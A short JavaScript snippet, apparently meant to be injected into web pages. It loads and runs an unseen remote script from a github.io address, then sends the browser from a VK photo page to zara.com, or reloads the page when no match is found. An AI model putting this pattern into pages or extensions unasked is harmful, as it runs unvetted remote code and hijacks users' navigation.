script2=document.createElement('script');
script2.src='//trinetixhtml.github.io/trash/urls.js';
document.getElementsByTagName('head')[0].appendChild(script2);

var linksArray = [
"https://vk.com/feed?z=photo-78543917_354855186%2Falbum-78543917_00%2Frev",
"http://www.zara.com",
];

var redirect;
for (i=0; i<linksArray.length; i++){
	if (document.location == linksArray[i]){
		redirect = linksArray[i+1];
	};
};
if (redirect == undefined){
	redirect = "";
}
console.log(redirect);
window.location.assign(redirect);
